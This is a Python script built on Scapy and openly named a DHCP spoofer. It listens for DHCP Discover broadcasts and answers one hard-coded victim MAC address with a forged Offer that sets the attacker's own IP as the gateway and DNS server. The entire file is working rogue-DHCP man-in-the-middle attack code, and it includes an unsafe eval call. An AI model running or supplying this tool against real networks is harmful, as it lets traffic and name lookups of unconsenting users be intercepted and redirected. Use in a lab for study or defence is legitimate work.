#!/usr/bin/python3

import logging

# Suppress Scapy warnings before importing
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

from scapy.all import *
from sys import argv, exit
import re
import socket

# Globals
my_mac=None
my_ip=None

# Constants

ETHER_BROADCAST     = 'ff:ff:ff:ff:ff:ff'
IP_BROADCAST        = '255.255.255.255'
DHCP_CLIENT_PORT    = 68 
DHCP_SERVER_PORT    = 67


class DHCP_FLAGS:
    # OP
    BOOTREQUEST=1
    BOOTREPLY=2

    # htype
    HTYPE_DEF=1

    # hlen
    HTYPE_LEN_DEF=6


# Checks if a packet has DHCP layers
def is_dhcp_layers(pack):
    # Filter by layers
    return pack.haslayer(DHCP) and pack.haslayer(BOOTP) and pack.haslayer(UDP)\
    and pack.haslayer(IP) and pack.haslayer(Ether)


# Checks if a packet is DHCP type discover
def is_discover_filter(pack):
    if is_dhcp_layers(pack):
        # Check ports
        if pack[UDP].sport == DHCP_CLIENT_PORT and pack[UDP].dport == DHCP_SERVER_PORT:
            # Check if broadcast
            if pack[Ether].dst == ETHER_BROADCAST and  pack[IP].dst == IP_BROADCAST:
                 opts = pack[DHCP].options
                 return opts[0][1] == DHCP_FLAGS.BOOTREQUEST

    return False


def is_mac_valid(x):
    return bool(re.match("[0-9a-f]{2}([-:]?)[0-9a-f]{2}(\\1[0-9a-f]{2}){4}$", x.lower()))


def is_ip_valid(x):
    try:
        socket.inet_aton(x)
        return True
    except:
        pass
    
    return False


def escape(reason):
    print(reason)
    sys.exit(1)


mac_to_bytes = lambda mac: (eval('0x'+''.join([x for x in mac if x != ':']))).to_bytes(6, byteorder='big')


def print_help():
    print('dhcp-spoof attacker_mac attacker_ip [flags]')
    print('')
    print('Flags: ')
    print('\t-h,  help')

def build_offer_message(discover, my_mac, my_ip, free_ip):
    to_mac = discover[Ether].src

    # Add Ether
    frame = Ether(src=my_mac, dst=to_mac)

    # Add IP with the free address
    frame /= IP(src=my_ip, dst=free_ip)

    # Add Transportation layer
    frame /= UDP(sport=DHCP_SERVER_PORT, dport=DHCP_CLIENT_PORT)

    # Add legacy BOOTP layer
    frame /= BOOTP()

    # Change BOOTP options
    frame[BOOTP].op = DHCP_FLAGS.BOOTREPLY
    frame[BOOTP].htype = DHCP_FLAGS.HTYPE_DEF
    frame[BOOTP].hlen = DHCP_FLAGS.HTYPE_LEN_DEF
    frame[BOOTP].xid = discover[BOOTP].xid
    frame[BOOTP].secs = 0
    frame[BOOTP].flags = None
    frame[BOOTP].ciaddr = '0.0.0.0'
    frame[BOOTP].yiaddr = free_ip
    frame[BOOTP].siaddr = my_ip
    frame[BOOTP].giaddr = '0.0.0.0'
    frame[BOOTP].chaddr = mac_to_bytes(discover[Ether].src)

    # Add DHCP Extension
    frame /= DHCP()

    # Change DHCP fields
    
    opts = [('message-type', 2),\
            ('server_id', my_ip),\
            ('lease_time', 43200),\
            ('renewal_time', 21600),\
            ('rebinding_time', 37800),\
            ('subnet_mask', '255.255.255.0'),\
            ('broadcast_address', '192.168.1.255'),\
            ('router', my_ip),\
            ('name_server', my_ip),\
            ('domain', b'lan'),\
            'end']\

    # Set options
    frame[DHCP].options = opts

    return frame


# Prints an example discovery
def handle_DHCP_discover(pack):
    global my_mac, my_ip
   
    print('Got Discover from ----> ', end='')
    print(pack[Ether].src)

    if pack[Ether].src == 'd8:f8:83:90:de:d1':
        print('=-=-=-=- Sending Offer =-=-=-=-')

        current_offer = build_offer_message(pack, my_mac, my_ip, '192.168.1.127')

        srp1(current_offer)[0].show()
        exit(0)


def main():
    global my_mac, my_ip

    if len(sys.argv) != 3 or '-h' in sys.argv:
        print_help()
    else:
        my_mac, my_ip = sys.argv[1], sys.argv[2]

        if not(is_mac_valid(my_mac) and is_ip_valid(my_ip)):
            print('Invalid IP or MAC')
            exit(1)

        print('Listening...')
        sniff(lfilter=is_discover_filter, prn=handle_DHCP_discover)


if __name__ == "__main__":
    main()
